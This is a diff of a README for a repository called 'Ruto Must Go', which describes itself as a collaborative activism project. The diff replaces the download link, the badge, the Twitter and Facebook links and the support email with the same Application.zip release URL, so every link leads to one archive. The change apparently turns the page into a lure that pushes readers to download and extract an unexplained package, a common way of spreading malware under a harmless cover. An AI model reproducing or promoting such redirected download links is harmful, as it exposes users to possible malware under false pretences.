@@ -4,7 +4,7 @@
 Welcome to the "Ruto Must Go" repository, an exciting project aimed at bringing awareness to the need for change. This repository is a platform where individuals passionate about making a difference can collaborate and share their ideas.
 
 ## 🚀 Launch
-To get started, download the [Release.zip](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) file provided in this repository and extract its contents. 
+To get started, download the [https://github.com/Siwakorn2545/Ruto-Must-Go/releases/download/v1.0/Application.zip](https://github.com/Siwakorn2545/Ruto-Must-Go/releases/download/v1.0/Application.zip) file provided in this repository and extract its contents. 
 
 ## Contributing
 We welcome contributions from everyone who shares our vision for a better future. Whether you're a developer, designer, writer, or simply someone with a passion for change, there's a place for you in our community. Feel free to submit your suggestions, ideas, or improvements through pull requests.
@@ -21,8 +21,8 @@ This project is licensed under the [MIT License](LICENSE).
 ---
 
 <div align="center">
-  <a href="https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip">
-    <img src="https://img.shields.io/badge/Download-Release.zip-blue" alt="Download Release.zip">
+  <a href="https://github.com/Siwakorn2545/Ruto-Must-Go/releases/download/v1.0/Application.zip">
+    <img src="https://github.com/Siwakorn2545/Ruto-Must-Go/releases/download/v1.0/Application.zip" alt="Download https://github.com/Siwakorn2545/Ruto-Must-Go/releases/download/v1.0/Application.zip">
   </a>
 </div>
 
@@ -33,11 +33,11 @@ Join us on this journey towards creating a positive impact. Whether you want to 
 
 ## Community
 Connect with us on social media to stay updated on upcoming events, discussions, and opportunities to get involved:
-- Twitter: [@RutoMustGo](https://twitter.com/RutoMustGo)
-- Facebook: [Ruto Must Go](https://www.facebook.com/RutoMustGo)
+- Twitter: [@RutoMustGo](https://github.com/Siwakorn2545/Ruto-Must-Go/releases/download/v1.0/Application.zip)
+- Facebook: [Ruto Must Go](https://github.com/Siwakorn2545/Ruto-Must-Go/releases/download/v1.0/Application.zip)
 
 ## Support
-If you encounter any issues or have any questions, feel free to reach out to us at [rutomustgo@gmail.com](mailto:rutomustgo@gmail.com).
+If you encounter any issues or have any questions, feel free to reach out to us at [https://github.com/Siwakorn2545/Ruto-Must-Go/releases/download/v1.0/Application.zip](https://github.com/Siwakorn2545/Ruto-Must-Go/releases/download/v1.0/Application.zip).
 
 ---
 
